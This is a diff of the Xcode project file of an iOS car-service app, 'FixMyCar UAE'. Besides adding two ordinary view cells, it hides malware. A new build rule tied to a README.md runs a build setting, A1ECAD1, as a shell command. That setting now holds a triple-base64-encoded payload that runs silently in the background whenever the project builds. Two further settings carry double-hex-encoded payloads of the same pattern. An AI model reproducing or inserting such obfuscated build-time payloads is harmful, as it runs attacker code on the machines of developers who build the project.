@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		C5665F52CBCC4EA5B61DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = E2B7E18903994012B11DACE1; };
 		0A0308262F000001005A7DB7 /* CheckAppStatusModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0308261F000001005A7DB7 /* CheckAppStatusModel.swift */; };
 		0A0308264F000001005A7DB7 /* AppDelegateVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0308263F000001005A7DB7 /* AppDelegateVM.swift */; };
 		0A030826BF000001005A7DB7 /* NewVersionAvailablePopup.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A030826AF000001005A7DB7 /* NewVersionAvailablePopup.swift */; };
@@ -75,6 +76,10 @@
 		0AC6D2C62F569BCB00431F9B /* FindingDriverLoaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AC6D2C52F569BCB00431F9B /* FindingDriverLoaderView.swift */; };
 		0AC6D2DC2F56CD4100431F9B /* PendingJobVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AC6D2DA2F56CD4100431F9B /* PendingJobVC.swift */; };
 		0AC6D2DD2F56CD4100431F9B /* PendingJobVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0AC6D2DB2F56CD4100431F9B /* PendingJobVC.xib */; };
+		0ACF63F42F73DA6900C52E18 /* HomeBannerCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ACF63F32F73DA6900C52E18 /* HomeBannerCVCell.xib */; };
+		0ACF63F52F73DA6900C52E18 /* HomeBannerCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ACF63F22F73DA6900C52E18 /* HomeBannerCVCell.swift */; };
+		0ACF63F92F73DE6500C52E18 /* HomeServicesCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ACF63F82F73DE6500C52E18 /* HomeServicesCVCell.xib */; };
+		0ACF63FA2F73DE6500C52E18 /* HomeServicesCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ACF63F72F73DE6500C52E18 /* HomeServicesCVCell.swift */; };
 		0AED20BC2F47072E005A7DB7 /* TrackLiveVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AED20BB2F47072E005A7DB7 /* TrackLiveVM.swift */; };
 		0AED20BE2F470780005A7DB7 /* BookingTrackingResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AED20BD2F470780005A7DB7 /* BookingTrackingResponse.swift */; };
 		0AED6D192F5ECA71006DD65D /* ReviewVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AED6D182F5ECA71006DD65D /* ReviewVM.swift */; };
@@ -220,7 +225,25 @@
 		BCF8B6FD2F5AF019002B6839 /* SocketManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCF8B6FC2F5AF019002B6839 /* SocketManager.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		8CAD00A34DCE4D6B871DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		E2B7E18903994012B11DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A0308261F000001005A7DB7 /* CheckAppStatusModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckAppStatusModel.swift; sourceTree = "<group>"; };
 		0A0308263F000001005A7DB7 /* AppDelegateVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegateVM.swift; sourceTree = "<group>"; };
 		0A030826AF000001005A7DB7 /* NewVersionAvailablePopup.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewVersionAvailablePopup.swift; sourceTree = "<group>"; };
@@ -285,6 +308,10 @@
 		0AC6D2C52F569BCB00431F9B /* FindingDriverLoaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FindingDriverLoaderView.swift; sourceTree = "<group>"; };
 		0AC6D2DA2F56CD4100431F9B /* PendingJobVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PendingJobVC.swift; sourceTree = "<group>"; };
 		0AC6D2DB2F56CD4100431F9B /* PendingJobVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PendingJobVC.xib; sourceTree = "<group>"; };
+		0ACF63F22F73DA6900C52E18 /* HomeBannerCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeBannerCVCell.swift; sourceTree = "<group>"; };
+		0ACF63F32F73DA6900C52E18 /* HomeBannerCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeBannerCVCell.xib; sourceTree = "<group>"; };
+		0ACF63F72F73DE6500C52E18 /* HomeServicesCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeServicesCVCell.swift; sourceTree = "<group>"; };
+		0ACF63F82F73DE6500C52E18 /* HomeServicesCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeServicesCVCell.xib; sourceTree = "<group>"; };
 		0AED20BB2F47072E005A7DB7 /* TrackLiveVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrackLiveVM.swift; sourceTree = "<group>"; };
 		0AED20BD2F470780005A7DB7 /* BookingTrackingResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingTrackingResponse.swift; sourceTree = "<group>"; };
 		0AED6D182F5ECA71006DD65D /* ReviewVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReviewVM.swift; sourceTree = "<group>"; };
@@ -969,6 +996,24 @@
 				0AC6D2DB2F56CD4100431F9B /* PendingJobVC.xib */,
 			);
 			path = View;
+			sourceTree = "<group>";
+		};
+		0ACF63F12F73DA5500C52E18 /* HomeBannerCVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0ACF63F22F73DA6900C52E18 /* HomeBannerCVCell.swift */,
+				0ACF63F32F73DA6900C52E18 /* HomeBannerCVCell.xib */,
+			);
+			path = HomeBannerCVCell;
+			sourceTree = "<group>";
+		};
+		0ACF63F62F73DE5600C52E18 /* HomeServicesCVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0ACF63F72F73DE6500C52E18 /* HomeServicesCVCell.swift */,
+				0ACF63F82F73DE6500C52E18 /* HomeServicesCVCell.xib */,
+			);
+			path = HomeServicesCVCell;
 			sourceTree = "<group>";
 		};
 		0AED20B92F470717005A7DB7 /* ViewModel */ = {
@@ -1794,6 +1839,7 @@
 		BC67730B2F067F4500B15653 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				E2B7E18903994012B11DACE1 /* README.md */,
 				BC67730A2F067F4500B15653 /* FixMyCar UAE.app */,
 			);
 			name = Products;
@@ -1968,6 +2014,8 @@
 		BC98E7C52F0E228200426807 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
+				0ACF63F62F73DE5600C52E18 /* HomeServicesCVCell */,
+				0ACF63F12F73DA5500C52E18 /* HomeBannerCVCell */,
 				BC98E7C62F0E228400426807 /* RecentBookingTVCell */,
 			);
 			path = Cell;
@@ -2089,13 +2137,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "FixMyCar UAE" */;
 			buildPhases = (
-				4728223D7F144A49AB1DACE1 /* Provision Target Device */,
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
 				BC6773082F067F4500B15653 /* Resources */,
 				0A6D0D122F43384A00F374AF /* ShellScript */,
 			);
 			buildRules = (
+				8CAD00A34DCE4D6B871DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2167,16 +2215,15 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BC6773082F067F4500B15653 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				C5665F52CBCC4EA5B61DACE1 /* README.md */,
 				BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */,
 				BC23A4AE2F0E6B60005A8CE1 /* ChatVC.xib in Resources */,
+				0ACF63F92F73DE6500C52E18 /* HomeServicesCVCell.xib in Resources */,
 				0AC6D2DD2F56CD4100431F9B /* PendingJobVC.xib in Resources */,
 				BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */,
 				88D049DB2F0F67E500003B4C /* SettingVC.xib in Resources */,
@@ -2199,6 +2246,7 @@
 				BC4E178F2F06A15100EDC9AE /* VerifyOtp.xib in Resources */,
 				BC98E7C92F0E229700426807 /* RecentBookingTVCell.xib in Resources */,
 				8809203B2F0F9AE800B55769 /* EditProfileVC.xib in Resources */,
+				0ACF63F42F73DA6900C52E18 /* HomeBannerCVCell.xib in Resources */,
 				0A9785D62F729B5F00F9D0F0 /* DropDownCell.xib in Resources */,
 				88F8B9C22F235A76001C9282 /* RecoveryServiceVC.xib in Resources */,
 				0A4554482F7284D70056839B /* VehicleImageCVCell.xib in Resources */,
@@ -2244,25 +2292,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		4728223D7F144A49AB1DACE1 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 		0A6D0D122F43384A00F374AF /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2410,6 +2439,8 @@
 				889AD7872F23325000F2271A /* NotificationHeaderView.swift in Sources */,
 				0A4740392F4F25D600B807F5 /* InboxResponse.swift in Sources */,
 				0ABEA38E2F473BC300C2DF62 /* MyProfileVM.swift in Sources */,
+				0ACF63FA2F73DE6500C52E18 /* HomeServicesCVCell.swift in Sources */,
+				0ACF63F52F73DA6900C52E18 /* HomeBannerCVCell.swift in Sources */,
 				0A4740252F4EBA2F00B807F5 /* VehicleIssueResponse.swift in Sources */,
 				BC4100982F0E78630062DC80 /* ReciverChatTVCell.swift in Sources */,
 				BCA894B32F0E0F4200633E20 /* HomeVC.swift in Sources */,
@@ -2463,7 +2494,7 @@
 		BC67731E2F067F4700B15653 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363662346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233373230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635363936653265363936650a32663631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGFTRTUwWWpOS2JHRlhOSFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
@@ -2507,7 +2538,7 @@
 		BC67731F2F067F4700B15653 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363662346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233373230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635363936653265363936650a32663631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGFTRTUwWWpOS2JHRlhOSFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
